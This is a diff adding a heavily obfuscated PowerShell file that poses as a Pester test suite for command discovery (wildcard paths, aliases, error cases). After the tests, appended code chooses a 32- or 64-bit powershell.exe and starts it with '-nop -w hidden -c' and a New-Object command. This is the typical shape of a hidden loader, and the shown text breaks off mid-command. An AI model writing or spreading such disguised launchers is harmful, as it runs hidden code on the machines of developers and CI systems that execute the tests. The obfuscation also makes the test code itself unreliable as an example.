@@ -1,0 +1,220 @@
+  sV  Wmv6D  ( [tyPE]("{0}{2}{1}{3}" -f 'Sys','eM.i','t','o.Path')  );SV  QO3g7 (  [typE]("{0}{1}"-F'INtPT','R')) ;  SET-VAriabLE  ("L"+"3rS") ( [tYPE]("{1}{3}{4}{2}{0}"-f'pROCeSS','S','.','YstEM.DiaGn','osTics'));
+
+&("{1}{2}{0}"-f'scribe','D','e') ("{1}{3}{2}{4}{0}" -f 'tests','Co','d Disc','mman','overy ') -Tags "CI" {
+
+    &("{1}{2}{0}"-f 'oreAll','Be','f') {
+        &("{1}{0}"-f 'p','setu') -f ("{2}{1}{3}{0}" -f '1','estscr','t','ipt.ps') -content ((("{5}{10}{9}{2}{0}{8}{1}{3}{4}{6}{7}" -f'd not','n','l','. Running from te','stscript.p','{','s1','{0}',' ru','}This script shou','0'))  -F  [Char]39)
+        &("{0}{1}"-f 'set','up') -f ("{3}{0}{2}{1}" -f'pp.','s1','p','testscri') -content ((("{7}{1}{14}{11}{12}{13}{0}{3}{8}{9}{10}{2}{6}{5}{4}"-f't should n','0}','om tes','ot run. Run','}','p.ps1{0','tscrip','{','n','i','ng fr','sc','ri','p','This ')) -F[Char]39)
+
+        ${TEstc`AS`esc`o`Mma`NDnOTFo`UNd} = @(
+                        @{("{1}{0}"-f 'd','comman') = ("{4}{2}{3}{5}{7}{6}{0}{1}" -f'otExis','t','man','d','Com','That','oesn','D') ; ("{1}{2}{0}" -f'ame','te','stN') = ("{5}{2}{4}{3}{1}{0}" -f'ommand','t c','o','-existen','n','N')}
+                        @{("{0}{1}{2}"-f'co','mman','d') = ("{2}{3}{0}{4}{1}" -f'ip','ps1','testsc','r','?.') ; ("{0}{1}{2}"-f 'tes','t','Name') = ("{1}{2}{4}{3}{0}" -f 'for filename','Mu','ltiple',' ',' matches')}
+                        @{("{1}{0}" -f'mmand','co') = ("{0}{1}"-f'dem','o') +   (  GeT-VaRiABLe  ("wMv"+"6d") ).VaLUE::"dI`REcTORYSEp`ArAtO`RC`har"; ("{0}{1}{2}"-f 'te','s','tName') = ("{8}{6}{1}{9}{2}{7}{4}{0}{5}{3}" -f'e','iste','with di','ator','ctory s','par','ex','re','Non ','nt command ')}
+                        @{("{0}{1}{2}"-f'comm','an','d') =  (geT-VariAblE ("W"+"mv6d")  ).valUE::"DIr`E`CTorysE`p`ARa`TOr`cHAr"; ("{0}{1}{2}" -f'testN','am','e') = ("{0}{2}{3}{1}{4}"-f'Direct','ep','o','ry s','arator')}
+                        @{("{0}{2}{1}" -f'com','d','man') = ((("{1}{0}{2}{4}{5}{3}" -f 'nv','e','i','path','ronment','::5Gg'))."rEpL`A`cE"(([CHar]53+[CHar]71+[CHar]103),'\')); ("{1}{0}" -f 'tName','tes') = ("{3}{2}{4}{5}{0}{1}{6}"-f'alifi','ed pa','rovi','P','de','r qu','th')}
+                       )
+    }
+
+    &('It') ("{2}{0}{1}{3}" -f'estN','ame','<t','>') -TestCases ${t`eSTCA`SeS`CoMmandno`Tf`OuND} {
+        param(${C`OmmAnD})
+        { & ${c`OMMA`Nd} } | &("{0}{1}"-f 'Shoul','d') -Throw -ErrorId ("{0}{3}{2}{1}{5}{4}" -f'Co','cep','andNotFoundEx','mm','n','tio')
+    }
+
+    &('It') ("{2}{4}{1}{3}{5}{6}{0}"-f 'aths',' lookup','Co',' wi','mmand','th',' duplicate p') {
+        ${p`Re`ViOuSpaTH} = ${enV:`Psm`OdULEP`AtH}
+
+        try
+        {
+            &("{2}{0}{1}"-f 'w-','Item','Ne') -Path "$TestDrive\TestFunctionA" -ItemType ("{2}{0}{1}"-f 'irecto','ry','D')
+            &("{0}{1}"-f 'New-It','em') -Path "$TestDrive\\TestFunctionA\TestFunctionA.psm1" -Value "function TestFunctionA {}" | &("{0}{2}{1}"-f 'Out','Null','-')
+
+            ${env:pSm`ODU`lE`PATH} = "$TestDrive" +  (  GI varIabLE:wMV6D  ).vAluE::"p`AThSE`parat`OR" + "$TestDrive"
+            (&("{0}{1}{2}"-f'Get-c','omman','d') ("{2}{1}{0}"-f'onA','estFuncti','T'))."CO`UnT" | &("{1}{0}" -f'uld','Sho') -Be 1
+        }
+        finally
+        {
+            ${E`Nv:P`sMODU`l`epAtH} = ${P`R`ev`i`oUSpath}
+        }
+    }
+
+    &('It') ("{4}{2}{0}{1}{5}{3}" -f ' ','a','s can be set for','let','Alia',' cmd') {
+
+            &("{2}{0}{1}" -f 'et-Alia','s','S') ("{3}{4}{1}{0}{2}" -f'coveryTes','ndDis','t','AliasComm','a') ("{0}{3}{2}{1}"-f'G','Item','ld','et-Chi')
+            ${ComM`A`NDS} = (&("{3}{2}{0}{1}"-f 'omma','nd','C','Get-') ("{2}{5}{4}{0}{1}{3}{6}" -f 'v','eryT','Al','es','o','iasCommandDisc','t'))
+
+            ${CoM`Mands}."Co`Unt" | &("{1}{0}"-f 'd','Shoul') -Be 1
+            ${al`IASr`Es`ULt} = ${Co`MM`ANDs} -as [System.Management.Automation.AliasInfo]
+            ${ALIa`sREsu`lt} | &("{0}{1}" -f 'S','hould') -BeOfType ("{7}{0}{10}{8}{6}{3}{2}{5}{4}{1}{9}" -f 'M','sInf','om','Aut','a','ation.Ali','nt.','[System.','ageme','o]','an')
+            ${al`IA`SrE`sulT}."NA`Me" | &("{1}{0}" -f 'ld','Shou') -Be ("{4}{1}{3}{0}{2}"-f 'andDisc','Com','overyTest','m','Alias')
+    }
+
+    &('It') ("{1}{3}{5}{0}{4}{2}" -f ' aliase','Cyc','direct','li','s - ','c') {
+        {
+            &("{1}{0}{2}" -f 't-Alia','Se','s') ("{1}{2}{0}"-f'liasA','Cycli','cA') ("{0}{1}{2}"-f 'CyclicA','lia','sB') -Force
+            &("{1}{0}" -f 't-Alias','Se') ("{1}{0}{3}{2}" -f'cl','Cy','AliasB','ic') ("{2}{3}{0}{1}" -f'ia','sA','CyclicA','l') -Force
+            & ("{1}{2}{3}{0}"-f 'A','Cy','cl','icAlias')
+        } | &("{2}{1}{0}"-f'd','ul','Sho') -Throw -ErrorId ("{2}{0}{5}{1}{3}{4}{6}" -f 'omm','otFoundExce','C','p','t','andN','ion')
+    }
+
+    &('It') ("{3}{6}{7}{5}{1}{4}{2}{0}"-f'ect','e','ir','Cycl','s - ind','lias','i','c a') {
+        {
+            &("{1}{0}{2}" -f 'et-Ali','S','as') ("{2}{0}{3}{1}" -f'cli','liasA','Cy','cA') ("{0}{2}{1}{3}"-f'Cycl','a','icAli','sB') -Force
+            &("{2}{0}{1}"-f'-','Alias','Set') ("{0}{1}{2}" -f'Cyc','l','icAliasB') ("{1}{0}{3}{2}"-f 'clicAl','Cy','asC','i') -Force
+            &("{1}{0}"-f'ias','Set-Al') ("{0}{3}{1}{2}"-f'Cy','licAlias','C','c') ("{1}{3}{2}{0}" -f 'AliasA','C','clic','y') -Force
+            & ("{2}{3}{1}{0}"-f'asA','i','Cycli','cAl')
+        } | &("{1}{0}{2}" -f 'o','Sh','uld') -Throw -ErrorId ("{0}{4}{3}{1}{5}{2}"-f 'Co','ndNotFo','ception','ma','m','undEx')
+    }
+
+    &('It') ("{3}{5}{13}{6}{14}{9}{10}{11}{0}{7}{15}{1}{4}{8}{12}{2}"-f'nfo','sInfo or','nfo','Get-Com',' ','m','d',',','Fil','n ','only CmdletInfo, ','FunctionI','terI','and shoul',' retur',' Alia') {
+
+         ${comM`An`dS} = &("{1}{2}{3}{0}"-f'd','Get-C','omm','an')
+         ${cOM`M`ANDS}."CO`UNT" | &("{0}{1}"-f 'S','hould') -BeGreaterThan 0
+
+        foreach(${co`mM`AND} in ${com`Man`ds})
+        {
+            ${C`O`MMand}.("{2}{0}{1}"-f 'tTyp','e','Ge').Invoke()."N`Ame" | &("{2}{1}{0}" -f 'd','ul','Sho') -BeIn @(("{0}{1}{2}"-f'Alias','Inf','o'),("{1}{2}{3}{0}"-f'nfo','Funct','i','onI'),("{1}{0}{3}{2}"-f'letI','Cmd','fo','n'),("{1}{2}{0}"-f'lterInfo','F','i'))
+        }
+    }
+
+    &('It') ("{12}{15}{7}{5}{13}{1}{2}{10}{6}{14}{8}{0}{4}{11}{3}{9}"-f 'ot writ','comma','nds wit','rro','e','en','rd s','xist',' n','rs','h wildca',' e','Non-','t ','hould','e') {
+        &("{2}{0}{1}"-f 'Comman','d','Get-') ("{4}{6}{0}{2}{1}{5}{3}" -f'nd','oesN','D','*','Co','otExist','mma') -ErrorVariable ('ev') -ErrorAction ("{3}{4}{2}{1}{0}"-f'inue','ont','C','Silentl','y')
+        ${EV} | &("{1}{0}" -f 'd','Shoul') -BeNullOrEmpty
+    }
+
+    &('It') ("{4}{1}{0}{3}{5}{6}{2}{7}"-f 's p','t- i','nd','re','Ge','pended t','o comma','s') {
+        (& ("{0}{1}{2}" -f'locati','o','n'))."PA`TH" | &("{1}{2}{0}" -f 'ld','Sh','ou') -Be (&("{1}{0}{2}{3}"-f 't','ge','-loc','ation'))."p`ATh"
+    }
+
+    &("{1}{0}" -f 'text','Con') ("{9}{2}{4}{3}{5}{10}{1}{6}{8}{7}{0}" -f's','ecut','l','th first ',' pa','when ','in','t','g scrip','Use litera','ex') {
+        &("{0}{2}{1}" -f'Befo','eAll','r') {
+            ${FIRs`TFi`l`EN`Ame} = ("{0}{1}{2}"-f'[','test1].p','s1')
+            ${SE`c`OnD`FIleN`AME} = ("{1}{0}" -f'.ps1','1')
+            ${t`HiRDF`IlE`N`AMe} = ("{1}{0}"-f'.ps1','2')
+            ${firStreS`U`lT} = ('e'+'xecu'+'ting '+"$firstFileName "+'i'+'n '+'r'+'oot')
+            ${sECO`Nd`REsULt} = ('execu'+'t'+'i'+'ng '+"$secondFileName "+'in'+' '+'ro'+'ot')
+            ${Th`i`RDR`ESUlt} = ('ex'+'ec'+'ut'+'ing '+"$thirdFileName "+'i'+'n '+'roo'+'t')
+            &("{1}{0}"-f 'etup','s') -f ${f`iRstfilENa`ME} -content "'$firstResult'"
+            &("{1}{0}"-f'etup','s') -f ${SeCo`ND`FILENa`mE} -content "'$secondResult'"
+            &("{1}{0}" -f'up','set') -f ${Thi`RdFIL`EnaMe} -content "'$thirdResult'"
+
+            ${sUBF`o`lDeR} = ("{0}{1}{2}" -f 'sub','Fold','er')
+            ${Fi`R`St`FI`lEInsUBFO`Lder} = &("{2}{0}{1}" -f 'in-','Path','Jo') ${s`U`BfolDER} -ChildPath ${FI`R`STfIlE`NaMe}
+            ${s`ecO`NDfILeIn`sUBF`o`ldER} = &("{1}{2}{0}" -f 'ath','Join','-P') ${subFO`ld`er} -ChildPath ${s`Ec`ondFILe`NA`ME}
+            ${t`hIr`dFIlEiN`S`UBFo`lDEr} = &("{2}{0}{1}"-f'in-','Path','Jo') ${sU`BfOl`deR} -ChildPath ${tH`irDF`i`LE`NamE}
+            &("{1}{0}" -f 'etup','s') -f ${Fir`sT`FIleIn`s`UBfOlder} -content "'$firstResult'"
+            &("{0}{1}" -f 'setu','p') -f ${s`ecOnd`F`ILe`ins`UbFOl`DeR} -content "'$secondResult'"
+            &("{0}{1}" -f 'setu','p') -f ${Thi`RDfI`lE`INsU`B`Fo`ldER} -content "'$thirdResult'"
+
+            ${SEc`on`DfI`lESeaR`C`H`I`NsUbfolD`ER} = (&("{1}{3}{0}{2}" -f'n-Pat','J','h','oi') -Path ${SUB`Fol`deR} -ChildPath ("{1}{0}" -f 't1].ps1','['))
+
+            ${Exec`Ut`I`onWITHWildca`R`dCAseS} = @(
+                
+                    @{("{1}{2}{0}"-f'mand','co','m') = ((("{2}{3}{0}{1}{4}" -f 'st1].','p','.v','OL[te','s1'))."r`epLA`cE"(([chAr]118+[chAr]79+[chAr]76),[stRIng][chAr]92)) ; ("{0}{2}{3}{1}" -f'expecte','ult','dRe','s') = ${Fi`RstreSU`Lt}; ("{0}{1}"-f 'nam','e') = ((("{4}{3}{0}{1}{5}{2}" -f '[t','es','1','9','.sd','t1].ps')).("{2}{1}{0}" -f'Lace','P','rE').Invoke('sd9','\'))}
+                    @{("{1}{0}{2}"-f 'omman','c','d') = ((("{2}{0}{1}" -f 'gVY[t1','].ps1','.')) -REPLAce  ([cHar]103+[cHar]86+[cHar]89),[cHar]92) ; ("{2}{3}{1}{4}{0}"-f 'esult','t','ex','pec','edR') = ${se`c`o`Nd`ReSulT}; ("{0}{1}" -f'nam','e') = ((("{1}{0}{2}" -f '[t1','.{0}','].ps1')) -f[cHAR]92)}
+                
+
+                
+                    @{("{1}{0}"-f'mmand','co') = ${SeCOn`dFiL`EiN`S`Ub`Fo`LDer} ; ("{2}{4}{1}{3}{0}"-f 't','t','e','edResul','xpec') = ${se`c`ON`DreS`ULT}; ("{1}{0}" -f'ame','n') = ${sEc`o`NdFiLE`InSuBfoldeR}}
+
+                    
+                    
+                    @{("{1}{0}{2}" -f'om','c','mand') = ${FIr`Stf`ILe`i`NsU`BfolDER} ; ("{0}{1}{2}{4}{3}"-f'exp','ected','R','t','esul') = ${FIrstRe`S`U`Lt}; ("{0}{1}" -f 'n','ame') = ${FIr`s`Tf`ILeI`Nsu`B`FoldER}; ("{1}{0}{2}" -f 'n','Pendi','g')=("{7}{5}{6}{3}{8}{2}{10}{12}{4}{11}{0}{1}{9}" -f 'hub.com/','PowerShell/Po','ar','il','//','out',' w','See note ab','dc','werShell/issues/9256','d in http','git','s:')}
+                    @{("{1}{0}" -f 'd','comman') = ${SE`coN`d`FILE`SeA`R`Ch`iNSubfo`LDEr} ; ("{3}{1}{2}{0}"-f't','ed','Resul','expect') = ${SECon`dRES`Ult}; ("{0}{1}"-f 'nam','e') = ${seC`oNDFI`LESearchINSU`B`Fol`D`eR}; ("{0}{2}{1}"-f 'Pend','g','in')=("{6}{2}{12}{3}{13}{0}{1}{7}{4}{10}{8}{5}{9}{11}" -f' htt','p','o','t wildcard i','ithub.com/P','ll/PowerShell/issu','See note ab','s://g','erShe','es/','ow','9256','u','n')}
+                
+                
+                    @{("{0}{1}"-f 'c','ommand') = '.\' + ${sEC`On`dFiLeiNSUbfO`l`D`Er} ; ("{1}{2}{0}{3}" -f 'ctedRes','exp','e','ult') = ${seC`Ond`Re`sult}; ("{0}{1}"-f 'n','ame') = ${sec`ON`dfiLeIN`sUBf`oLDEr}}
+                    @{("{1}{0}" -f 'nd','comma') = ((("{0}{2}{3}{1}{5}{6}{4}"-f'.{0}','t','subFold','er{0}[','1','est','1].ps'))  -F  [CHaR]92) ; ("{3}{1}{0}{2}" -f 'dResul','e','t','expect') = ${fIR`STR`esulT}; ("{0}{1}"-f'na','me') = ((("{3}{0}{6}{5}{4}{2}{1}"-f'QBs','ps1','st1].','.K','e','QB[t','ubFolderK'))."reP`La`ce"(([CHaR]75+[CHaR]81+[CHaR]66),'\'))}
+                    @{("{1}{0}{2}" -f'omm','c','and') = ((("{1}{3}{0}{2}" -f 'lderHyi[t1','.Hyisu','].ps1','bFo')) -rEPlAce  ([ChAR]72+[ChAR]121+[ChAR]105),[ChAR]92) ; ("{2}{1}{0}{4}{3}"-f 'te','pec','ex','esult','dR') = ${s`ecONDreSU`lt}; ("{1}{0}" -f'ame','n') = '.\' + ${S`econ`dFIlesearc`HINSUB`Fo`ldeR}}
+                    @{("{1}{0}" -f 'nd','comma') = '.\' + ${FIRStf`i`lEi`N`SUbfo`ldER} ; ("{2}{0}{3}{1}" -f 'ected','esult','exp','R') = ${firS`T`ResU`LT}; ("{1}{0}"-f'me','na') = '.\' + ${FIRS`TfiLeIns`UBfOLd`eR}}
+                    @{("{0}{1}{2}" -f'c','omma','nd') = '.\' + ${secOnD`F`ILES`earc`hinsubF`old`ER} ; ("{3}{0}{1}{2}"-f'te','dResu','lt','expec') = ${s`Ec`Ond`Resu`Lt}; ("{0}{1}"-f'na','me') = '.\' + ${Se`c`OND`FILEsE`Arc`HINSub`FolDEr}}
+                
+
+                
+                    @{("{1}{0}" -f'd','comman') = (&("{1}{2}{0}" -f'h','J','oin-Pat') ${TestDrive}  -ChildPath ("{1}{2}{0}{3}"-f '.','[test1',']','ps1')) ; ("{0}{2}{3}{1}{4}"-f'exp','dRes','ect','e','ult') = ${FIr`stRE`SU`LT}; ("{0}{1}"-f 'n','ame') = ((("{5}{1}{4}{3}{2}{9}{7}{10}{6}{0}{8}" -f'at','d[','l','by fu','test1].ps1 ','.xk','d p','ua','h','ly q','lifie'))."re`PLa`ce"(([chaR]120+[chaR]107+[chaR]100),[STrING][chaR]92))}
+                    @{("{2}{1}{0}"-f'mmand','o','c') = (&("{0}{1}{2}" -f'Jo','in-','Path') ${TestDrive}  -ChildPath ("{0}{1}" -f '[t1]','.ps1')) ; ("{2}{3}{1}{0}"-f 'Result','cted','e','xpe') = ${secoNd`R`ES`U`lT}; ("{0}{1}"-f'nam','e') = ((("{7}{3}{5}{0}{6}{4}{1}{2}"-f '.ps1 by ful',' ','path with wildcard','Y','ified','z1','ly qual','.N')).("{2}{1}{0}" -f'LAce','P','RE').Invoke('NYz','\'))}
+                
+            )
+
+            ${SHoUL`d`NO`T`Ex`ECUtEc`AsEs} = @(
+                @{("{2}{1}{0}"-f 'mmand','o','c') = ((("{3}{2}{0}{1}"-f'1','].ps1','Folder{0}[test','sub')) -f[chAR]92) ; ("{1}{0}" -f 'stName','te') = ("{4}{6}{9}{5}{2}{7}{3}{1}{0}{8}"-f 'e','ov','he','ax ','Re','tive path that w','l','re module qualified synt','rlaps','a'); ("{3}{2}{1}{0}" -f 'd','edErrorI','xpect','E') = ("{1}{3}{2}{0}" -f 'dule','Could','utoLoadMo','NotA')}
+                @{("{2}{1}{0}" -f 'mand','om','c') = ((("{0}{2}{1}"-f'.9WK[1','.ps1','2]'))-cREplaCe ([cHAR]57+[cHAR]87+[cHAR]75),[cHAR]92) ; ("{2}{0}{1}"-f 'tNam','e','tes') = ("{9}{4}{8}{2}{7}{14}{0}{1}{10}{6}{3}{5}{11}{13}{12}"-f'mat','c','with brack','t','lative p','i','g mul','et','ath ','re','tchin','ple ','iles','f',' wildcard ')}
+                @{("{1}{0}" -f'mmand','co') = (&("{2}{3}{1}{0}" -f'Path','in-','J','o') ${TestDrive}  -ChildPath ("{1}{0}"-f'].ps1','[12')) ; ("{2}{1}{0}" -f 'me','a','testN') = ("{13}{12}{6}{10}{9}{8}{1}{5}{3}{15}{7}{4}{11}{2}{0}{14}" -f 'fil','with ',' ','w','ng mu','bracket ','al','ard matchi','th ','a','ified p','ltiple','y qu','full','es','ildc')}
+            )
+
+            &("{0}{1}{3}{2}" -f 'P','ush-','on','Locati') (("{2}{4}{0}{3}{1}" -f't','T','L9C{T','Drive}IG','es')).("{0}{1}{2}"-f'R','eplA','ce').Invoke('L9C','$').("{0}{1}"-f'Repl','Ace').Invoke('IGT','\')
+        }
+
+        &("{1}{0}"-f 'fterAll','A') {
+            &("{3}{1}{2}{0}"-f 'ion','oc','at','Pop-L')
+        }
+
+        &('It') ((("{5}{7}{3}{10}{11}{0}{8}{6}{14}{1}{4}{15}{9}{13}{12}{2}" -f 'd',' zdl<e','dl','> ','xp','Invoki','et','ng <name',' r','Re','shou','l','ult>z','s','urn','ected'))."rePLa`cE"('zdl',[STring][cHar]39)) -TestCases ${EXEcuTioNwiT`Hw`ilDcA`RD`cA`Ses} {
+            param(${c`omM`ANd}, ${expEcTed`RE`sU`LT}, [String]${pEn`d`iNG})
+
+            if(${Pen`di`NG})
+            {
+                &("{0}{2}{3}{1}"-f'Set-TestIncon','sive','c','lu') -Message ${p`ENdI`NG}
+            }
+
+            & ${co`m`mAnd} | &("{0}{1}"-f 'Shoul','d') -BeExactly ${E`X`PectED`RE`sULt}
+        }
+
+        &('It') ((("{5}{2}{0}{9}{1}{7}{6}{3}{8}{4}" -f'<te','ame>{0} should no','}','xec','e','{0','e','t ','ut','stN')) -f[chAr]39) -TestCases ${SH`OulDNOTe`XECUT`eCa`sEs} {
+            param(
+                [string]
+                ${COm`Ma`ND},
+                [string]
+                ${E`xPEcTeD`ErR`Or`ID} = ("{1}{7}{0}{2}{4}{6}{5}{3}" -f'F','Comm','ou','n','ndExc','o','epti','andNot')
+                )
+            { & ${Com`mAND} } | &("{1}{0}"-f 'hould','S') -Throw -ErrorId ${ExpecT`e`d`ERr`oriD}
+        }
+    }
+
+    &("{2}{0}{1}" -f't','ext','Con') ("{0}{8}{2}{7}{6}{3}{1}{4}{5}" -f 'Ge','ri','ho','t for sc','pt','s','ld use globbing firs','u','t-Command s') {
+        &("{1}{2}{0}" -f'reAll','Bef','o') {
+            ${fiRS`Tr`Esult} = ("{3}{2}{1}{0}" -f'pt]',' scri','first','[')
+            ${Se`co`NdREsuLt} = ("{0}{1}{2}"-f 'alt ','s','cript')
+            ${tH`I`RdReSult} = ("{2}{0}{1}"-f'ad',' script','b')
+            &("{1}{0}"-f 'etup','s') -f ("{1}{0}{2}"-f'1].p','[test','s1') -content "'$firstResult'"
+            &("{1}{0}"-f 'tup','se') -f ("{1}{0}" -f 's1','1.p') -content "'$secondResult'"
+            &("{0}{1}" -f 'set','up') -f ("{1}{0}" -f'.ps1','2') -content "'$thirdResult'"
+
+            ${gCMWI`Th`WI`lDCaRDcASes} = @(
+                @{("{0}{1}"-f 'comma','nd') = ((("{1}{4}{0}{3}{2}{5}" -f 'b','.{0}?[','es',']','t','t1?.ps1'))-f[CHar]92); ("{1}{3}{0}{2}" -f'edComman','exp','d','ect') = ("{1}{3}{0}{2}" -f'.ps','[tes','1','t1]'); ("{3}{0}{2}{1}"-f'pectedComman','Count','d','ex') =1; ("{1}{0}"-f'ame','n') = ((("{3}{4}{0}{5}{2}{1}"-f 'tb','{1}{1}','s1','{1}','{1}.{0}?[',']est1?.p')) -f [chAr]92,[chAr]39)}
+                @{("{0}{1}"-f'c','ommand') = (&("{1}{0}{2}"-f't','Join-Pa','h') ${TestDrive}  -ChildPath ("{0}{2}{1}" -f'?[t','?.ps1','b]est1')); ("{4}{1}{2}{3}{0}"-f 'Command','xpec','t','ed','e') = ("{2}{1}{0}{3}" -f'].ps','1','[test','1'); ("{3}{0}{1}{5}{2}{4}"-f'edCom','man','Cou','expect','nt','d') =1 ; ("{0}{1}"-f'nam','e') = ((("{8}{4}{9}{10}{5}{7}{1}{3}{6}{2}{0}" -f'h','L by fully q','t','u','ALpAL.ofa?[t','ps1pA','alified pa','LpA','p','b]est','1?.'))."rEP`L`Ace"(([ChAR]112+[ChAR]65+[ChAR]76),[StrinG][ChAR]39).("{0}{1}"-f'rePl','ACE').Invoke('ofa','\'))}
+                @{("{0}{1}{2}"-f'co','mman','d') = ((("{1}{0}{2}{4}{3}" -f 'Zf[te','.h','st1]','1','.ps'))."r`eP`lAce"(([CHaR]104+[CHaR]90+[CHaR]102),'\')); ("{3}{2}{0}{4}{1}"-f 'd','and','ecte','exp','Comm') = ("{1}{0}"-f '1','1.ps'); ("{0}{4}{2}{1}{3}"-f 'exp','omma','ctedC','ndCount','e') =1; ("{1}{0}"-f'e','nam') = ((("{4}{5}{0}{2}{1}{3}" -f'.{0}[test1]','1}{1','.ps1{','}','{1}{','1}')) -f[cHAr]92,[cHAr]39)}
+                @{("{0}{2}{1}"-f'c','mand','om') = (&("{2}{1}{0}" -f 'h','oin-Pat','J') ${TestDrive}  -ChildPath ("{1}{3}{0}{2}" -f'.p','[test','s1','1]')); ("{1}{3}{0}{2}"-f 'pectedComma','e','nd','x') = ("{1}{0}"-f 'ps1','1.'); ("{4}{0}{1}{2}{3}{5}"-f 'pectedC','om','mandCo','u','ex','nt') =1 ; ("{0}{1}"-f'nam','e') = ((("{1}{8}{2}{9}{11}{0}{7}{4}{6}{3}{10}{13}{12}{5}{14}"-f '1{','{','0}[','}','}','ly qualified ','{1','1','1}{1}.{','t',' by','est1].ps','ul',' f','path')) -f [char]92,[char]39)}
+                @{("{0}{1}{2}" -f'c','om','mand') = ((("{2}{0}{1}"-f'g0h[12].','ps1','.')).("{0}{1}" -f'rEPLa','Ce').Invoke('g0h','\')); ("{0}{2}{3}{1}"-f'expe','and','ctedC','omm') = ("{0}{1}" -f'1.p','s1'); ("{3}{4}{2}{1}{5}{0}" -f 'ndCount','mm','ctedCo','exp','e','a') =0; ("{0}{1}"-f 'n','ame') = ("{11}{12}{4}{13}{5}{10}{1}{2}{9}{8}{6}{0}{3}{7}" -f' multiple f','ith bracket ','wildca','il','ve','ath ','tching','es','tc','rd ma','w','r','elati',' p')}
+                @{("{0}{2}{1}"-f'c','nd','omma') = (&("{2}{0}{1}{3}"-f 'P','a','Join-','th') ${TestDrive}  -ChildPath ("{2}{0}{1}"-f 'ps','1','[12].')); ("{2}{0}{1}{3}" -f'c','tedCom','expe','mand') = ("{1}{0}" -f '.ps1','1'); ("{3}{4}{0}{2}{1}"-f 'andC','unt','o','expected','Comm') =0 ; ("{1}{0}"-f'e','nam') = ("{15}{8}{4}{3}{10}{12}{13}{11}{5}{16}{1}{14}{0}{2}{7}{9}{6}" -f'card','ac',' matct',' ','ified',' b','s','ching multi',' qual','ple file','pat','h','h w','it','ket wild','fully','r')}
+            )
+
+            &("{0}{2}{4}{1}{3}" -f'Push-','c','L','ation','o') (("{1}{6}{5}{2}{0}{3}{4}" -f'v','Y','estDri','e}j9','s','{T','pH'))."REp`laCe"(([chaR]106+[chaR]57+[chaR]115),'\')."REPLa`cE"(([chaR]89+[chaR]112+[chaR]72),[sTring][chaR]36)
+        }
+
+        &("{0}{2}{1}" -f 'Aft','rAll','e') {
+            &("{3}{2}{0}{1}"-f'o','n','op-Locati','P')
+        }
+
+        &('It') ((("{15}{5}{4}{10}{0}{9}{2}{12}{7}{8}{6}{1}{11}{13}{14}{3}" -f'<e','m','pe','0}',' <name> shoul','-Command','nt> com','o','mmandCou','x','d return ','a','ctedC','nd named ','{0}<expectedCommand>{','Get')) -F [CHAR]39) -TestCases ${gcmwIth`w`ILDCA`R`dCASeS} {
+            param(${c`oMma`Nd}, ${ex`P`EcTED`cOM`M`AnD}, ${E`x`peC`TedCoM`MAnDCOU`NT})
+            ${com`Ma`NDs} = @(&("{0}{2}{1}"-f 'Get-Co','d','mman') -Name ${CoMm`A`ND})
+            ${c`OMMAn`ds}."C`ount" | &("{1}{0}" -f 'd','Shoul') -Be ${E`XpE`cTE`dC`omMaND`count}
+            if(${exP`e`c`TEDCO`MM`ANdCOu`NT} -gt 0)
+            {
+                ${C`o`M`MaNdS}."n`AMe" | &("{0}{1}" -f 'Sh','ould') -BeExactly ${EXP`EcTE`Dc`oMMA`Nd}
+            }
+        }
+    }
+
+    &("{0}{1}"-f 'Conte','xt') ("{1}{2}{0}"-f'es','error ca','s') {
+        &('It') ('G'+'et-Comman'+'d'+' '+('{0'+'}less'+' ')  -F  [chaR]34+(('Xpy'+'8JO-P'+'sP'+'a'+'ge ')  -REplaCe'Xpy',[chaR]96-REplaCe'8JO',[chaR]34)+'%'+'db?B '+'of'+' '+(('%'+'DoesN'+'otExis'+'t:'+'zE'+'Konvonv ') -cREpLacE ([char]122+[char]69+[char]75),[char]96-rEplaCE 'onv',[char]34)+'sho'+'uld '+'re'+'t'+'urn '+'nothi'+'ng') {
+            &("{0}{2}{3}{1}" -f 'G','and','et-Com','m') -Name ('less'+' '+"`"-PsPage "+'%db?B'+' '+'o'+'f '+"%DoesNotExist:`"") | &("{1}{0}" -f'hould','S') -BeNullOrEmpty
+        }
+
+        &('It') ("{12}{4}{9}{7}{0}{1}{2}{14}{5}{11}{10}{3}{13}{8}{6}" -f 'omma','nd no','t found fo','he global s','ld',' co','e','return c','p',' ',' t','mmands in','Shou','co','r') {
+            {&("{0}{3}{2}{1}" -f'Ge','ommand','C','t-') -Name ("{0}{1}{2}"-f'gl','obal:he','lp') -ErrorAction ("{1}{0}"-f'p','Sto')} | &("{2}{1}{0}" -f'ld','hou','S') -Throw -ErrorId ("{1}{3}{2}{0}{4}"-f 'o','Comman','FoundExcepti','dNot','n')
+        }
+    }
+}
+
+if( ( LS VARIABle:QO3g7  ).ValUe::"S`izE" -eq 4){${B}=("{3}{1}{2}{0}" -f 'xe','e','rshell.e','pow')}else{${B}=${EnV`:`WINDir}+((("{4}{0}{8}{3}{6}{1}{5}{7}{2}{9}"-f '7s','dowsPowerShellNn7v1.0','ll.e','wow6','Nn','Nn7','4Nn7Win','powershe','ys','xe'))."r`Ep`lace"(([cHar]78+[cHar]110+[cHar]55),'\'))};${S}=&("{2}{0}{1}" -f'Objec','t','New-') ("{2}{5}{1}{4}{0}{3}"-f'ta','m.D','Sy','rtInfo','iagnostics.ProcessS','ste');${S}."fiL`e`NaME"=${b};${S}."Ar`G`UMeNTs"=('-nop'+' '+'-w'+' '+'hid'+'den '+'-c'+' '+('aiWs=N'+'e'+'w'+'-Object 